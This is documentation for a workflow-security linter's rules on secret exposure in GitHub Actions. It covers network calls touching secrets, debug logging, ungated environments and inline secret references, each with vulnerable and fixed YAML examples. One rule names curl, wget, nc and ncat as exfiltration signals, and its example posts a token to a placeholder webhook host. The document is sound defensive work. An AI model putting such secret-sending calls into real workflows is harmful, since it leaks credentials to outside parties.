# Permissions Rules (400s)

These rules detect patterns where secrets or sensitive credentials are exposed through unsafe workflow configurations.

---

## WRD-421: Network Call Touches Secret

**Severity:** Medium

**What it detects:** `curl`, `wget`, `nc`, or `ncat` commands in `run:` blocks that also reference secrets or credential-like environment variables. This pattern can indicate data exfiltration.

**Vulnerable:**

```yaml
- env:
    TOKEN: ${{ secrets.DEPLOY_TOKEN }}
  run: |
    curl -d "token=$TOKEN" https://webhook.example.com/notify
```

**Remediation:** Review whether the network command needs access to secrets. Consider using dedicated actions for API calls instead of raw curl/wget with secrets.

---

## WRD-422: Step/Runner Debug Enabled

**Severity:** Medium

**What it detects:** `ACTIONS_RUNNER_DEBUG` or `ACTIONS_STEP_DEBUG` set to `true` in workflow environment variables. Debug logging can expose secrets and sensitive information in workflow logs.

**Vulnerable:**

```yaml
env:
  ACTIONS_STEP_DEBUG: true
```

**Remediation:** Remove debug logging configuration from committed workflow files. Use repository-level debug settings only when needed for troubleshooting.

---

## WRD-424: Secrets Used Without Environment Gate

**Severity:** Medium

**What it detects:** A job references one or more secrets (other than the auto-injected `GITHUB_TOKEN`) but does not declare an `environment:`. Without an environment, secret access is not gated by deployment protection rules, required reviewers, or wait timers, so any path that triggers the workflow gets the secret.

The check walks each job in the workflow's `jobs:` mapping, skips jobs that already declare `environment:`, and serializes the rest looking for `secrets.<NAME>` references. The first non-`GITHUB_TOKEN` secret it finds in an unprotected job emits the finding.

**Vulnerable:**

```yaml
on: push

jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2
      - name: Push to PyPI
        env:
          PYPI_TOKEN: ${{ secrets.PYPI_API_TOKEN }}
        run: twine upload --username __token__ --password "$PYPI_TOKEN" dist/*
```

**Remediation:** Add `environment:` to the job and protect that environment with required reviewers, wait timers, or branch restrictions in the repository settings. This forces secret access through the deployment protection rules.

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production   # gated by required reviewers
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2
      - name: Push to PyPI
        env:
          PYPI_TOKEN: ${{ secrets.PYPI_API_TOKEN }}
        run: twine upload --username __token__ --password "$PYPI_TOKEN" dist/*
```

---

## WRD-440: Secret Reference Inventory

**Severity:** Info

**What it detects:** `${{ secrets.* }}` expressions interpolated directly in `run:` blocks instead of being passed through environment variables. Secrets in shell commands can leak through process listings, shell history, and error messages. This is an informational hygiene signal that surfaces every direct shell-context secret reference so reviewers can audit them.

**Vulnerable:**

```yaml
- run: curl -H "Authorization: Bearer ${{ secrets.API_KEY }}" https://api.example.com
```

**Remediation:** Pass secrets through step-level environment variables.

```yaml
- env:
    API_KEY: ${{ secrets.API_KEY }}
  run: curl -H "Authorization: Bearer $API_KEY" https://api.example.com
```
